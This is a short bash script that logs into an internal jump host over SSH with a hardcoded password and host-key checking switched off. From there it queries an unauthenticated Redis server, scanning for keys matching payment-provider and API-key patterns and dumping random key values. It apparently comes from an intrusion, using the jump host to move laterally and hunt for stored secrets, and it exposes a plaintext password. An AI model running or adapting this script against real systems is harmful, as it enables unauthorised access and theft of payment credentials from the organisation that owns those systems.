#!/bin/bash
export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

# Try Redis from internaltools (10.14.36.19) which is the jump host
/usr/bin/sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 user@10.14.36.19 bash << 'REMOTECMD'
export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

echo "=== CHECK redis-cli ==="
which redis-cli 2>/dev/null || echo "NO redis-cli"

echo "=== TRY REDIS CONNECT ==="
redis-cli -h 10.13.16.156 -p 6379 ping 2>/dev/null || echo "PING FAILED"

echo "=== TRY REDIS INFO ==="
redis-cli -h 10.13.16.156 -p 6379 info keyspace 2>/dev/null || echo "INFO FAILED"

echo "=== SCAN XENDIT ==="
redis-cli -h 10.13.16.156 -p 6379 --scan --pattern '*xendit*' 2>/dev/null | head -20
redis-cli -h 10.13.16.156 -p 6379 --scan --pattern '*xnd*' 2>/dev/null | head -20
redis-cli -h 10.13.16.156 -p 6379 --scan --pattern '*payment*' 2>/dev/null | head -20
redis-cli -h 10.13.16.156 -p 6379 --scan --pattern '*api*key*' 2>/dev/null | head -20

echo "=== DBSIZE ==="
redis-cli -h 10.13.16.156 -p 6379 dbsize 2>/dev/null

echo "=== RANDOM 5 KEYS ==="
for i in 1 2 3 4 5; do
  KEY=$(redis-cli -h 10.13.16.156 -p 6379 randomkey 2>/dev/null)
  echo "KEY[$i]: $KEY"
  redis-cli -h 10.13.16.156 -p 6379 type "$KEY" 2>/dev/null
  redis-cli -h 10.13.16.156 -p 6379 get "$KEY" 2>/dev/null | head -c 300
  echo
done

echo "=== DONE ==="
REMOTECMD
